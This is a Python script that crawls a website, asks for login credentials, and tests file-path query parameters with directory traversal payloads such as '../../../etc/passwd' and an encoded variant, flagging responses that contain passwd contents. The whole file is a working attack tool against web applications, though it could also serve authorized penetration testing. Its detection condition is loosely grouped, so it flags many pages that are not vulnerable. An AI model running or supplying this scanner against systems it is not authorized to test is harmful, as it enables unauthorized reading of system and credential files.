import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import Fore, Style
import re

# Directory traversal payloads
payloads = [
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "../..%2F..%2F..%2Fetc%2Fpasswd"
]

# Function to crawl the website and find internal pages
def crawl_website(base_url, session):
    print(Fore.CYAN + "[*] Crawling website..." + Style.RESET_ALL)
    visited_urls = set()
    urls_to_visit = [base_url]
    internal_urls = []

    while urls_to_visit:
        current_url = urls_to_visit.pop(0)
        if current_url in visited_urls:
            continue
        visited_urls.add(current_url)

        try:
            response = session.get(current_url)
            soup = BeautifulSoup(response.text, 'html.parser')

            for link in soup.find_all('a', href=True):
                url = urljoin(base_url, link['href'])
                parsed_url = urlparse(url)
                if base_url in url and url not in visited_urls and parsed_url.scheme in ['http', 'https']:
                    internal_urls.append(url)
                    urls_to_visit.append(url)
            print(Fore.GREEN + f"[+] Found page: {current_url}" + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + f"[-] Error crawling {current_url}: {str(e)}" + Style.RESET_ALL)

    return internal_urls

# Function to handle login if credentials are required
def handle_login(session, login_url):
    print(Fore.YELLOW + "[*] Login required" + Style.RESET_ALL)
    username = input("Enter username: ")
    password = input("Enter password: ")
    
    # Assuming a simple POST request for login
    login_data = {'username': username, 'password': password}
    response = session.post(login_url, data=login_data)

    if response.status_code == 200:
        print(Fore.GREEN + "[+] Login successful!" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[-] Login failed!" + Style.RESET_ALL)

# Function to identify file location parameters
def find_vulnerable_params(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    file_location_params = []

    for param, value in query_params.items():
        # Check if the value looks like a file path (contains a file extension)
        if re.search(r'\.\w{2,4}$', value[0]):
            file_location_params.append(param)

    return file_location_params

# Function to test directory traversal vulnerability
def test_directory_traversal(session, url, params):
    vulnerabilities = []
    
    for param in params:
        for payload in payloads:
            # Replace the value of the parameter with the payload
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = payload
            vulnerable_url = parsed_url._replace(query='&'.join([f'{k}={v[0]}' for k, v in query_params.items()])).geturl()

            try:
                response = session.get(vulnerable_url)

                # Check for directory traversal vulnerability indicators
                if (response.status_code == 200 and
                        ("root:" in response.text or "bin:" in response.text or "bash" in response.text or 
                         "file not found" not in response.text and "404" not in response.text)):
                    vulnerabilities.append({
                        'url': url,
                        'parameter': param,
                        'payload': payload
                    })
                    print(Fore.RED + f"[!] Vulnerability found! URL: {vulnerable_url}" + Style.RESET_ALL)
                    break  # Exit after finding a vulnerability for this parameter

            except requests.RequestException as e:
                print(Fore.RED + f"[-] Error testing {vulnerable_url}: {str(e)}" + Style.RESET_ALL)

    return vulnerabilities

# Main function to scan the target website
def scan_directory_traversal(base_url):
    session = requests.Session()
    internal_pages = crawl_website(base_url, session)

    # Ask for login if needed
    if any('login' in url for url in internal_pages):
        login_url = next(url for url in internal_pages if 'login' in url)
        handle_login(session, login_url)

    vulnerabilities_report = []

    for page in internal_pages:
        print(Fore.CYAN + f"[*] Testing {page}..." + Style.RESET_ALL)
        params = find_vulnerable_params(page)

        if params:
            print(Fore.YELLOW + f"[!] Testing file location parameters: {', '.join(params)}" + Style.RESET_ALL)
            vulnerabilities = test_directory_traversal(session, page, params)
            vulnerabilities_report.extend(vulnerabilities)
        else:
            print(Fore.YELLOW + f"[!] No file location parameters found in {page}" + Style.RESET_ALL)

    # Print the final report
    print(Fore.MAGENTA + "\n[***] Detailed Scan Report [***]" + Style.RESET_ALL)

    if vulnerabilities_report:
        print(Fore.GREEN + "Vulnerabilities Found:" + Style.RESET_ALL)
        for vuln in vulnerabilities_report:
            print(f" - URL: {vuln['url']}, Parameter: {vuln['parameter']}, Payload: {vuln['payload']}")
    else:
        print(Fore.RED + " - No vulnerabilities found." + Style.RESET_ALL)
